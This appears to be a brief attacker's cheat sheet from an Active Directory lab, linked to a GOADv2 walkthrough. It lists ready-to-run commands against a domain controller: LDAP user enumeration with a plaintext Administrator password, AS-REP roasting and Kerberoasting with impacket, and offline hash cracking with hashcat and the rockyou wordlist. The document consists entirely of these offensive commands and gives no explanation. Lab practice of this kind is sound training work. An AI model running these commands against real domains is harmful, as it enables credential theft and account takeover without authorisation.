
nxc ldap 192.168.10.20 -u Administrator -p 'admin123;' --active-users (ldap search user)
impacket-GetNPUsers DC01.local/ -dc-ip 192.168.10.20 -no-pass -usersfile user.txt (asreproast)
impacket-GetUserSPNs -no-preauth gilemette.malina -usersfile user.txt -dc-host DC01.local DC01.local/ (kerberoasting)

hashcat -m 18200 gilemette.malina.asrep /usr/share/wordlists/rockyou.txt (crack asrep)

https://mayfly277.github.io/posts/GOADv2-pwning-part12/
